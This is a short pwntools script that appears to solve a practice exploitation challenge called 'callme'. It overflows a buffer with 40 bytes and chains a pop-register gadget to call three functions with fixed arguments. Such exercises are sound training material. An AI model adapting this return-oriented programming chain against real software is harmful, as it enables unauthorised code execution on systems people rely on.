#!/usr/bin/env python
from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

local = 1
if local:
	p = process('./callme')
else:
	p = remote()

func_three = 0x401810
func_two = 0x401870
func_one = 0x401850
pop_rdi_rsi_rdx_ret = 0x0000000000401ab0

gdb.attach(p)

payload = cyclic(0x100)
payload = 'A' * 40
call_one = p64(pop_rdi_rsi_rdx_ret) + p64(1) + p64(2) + p64(3) + p64(func_one)
call_two = p64(pop_rdi_rsi_rdx_ret) + p64(1) + p64(2) + p64(3) + p64(func_two)
call_three = p64(pop_rdi_rsi_rdx_ret) + p64(1) + p64(2) + p64(3) + p64(func_three)
payload += call_one + call_two + call_three
p.recvuntil('> ')
p.sendline(payload)

p.interactive()
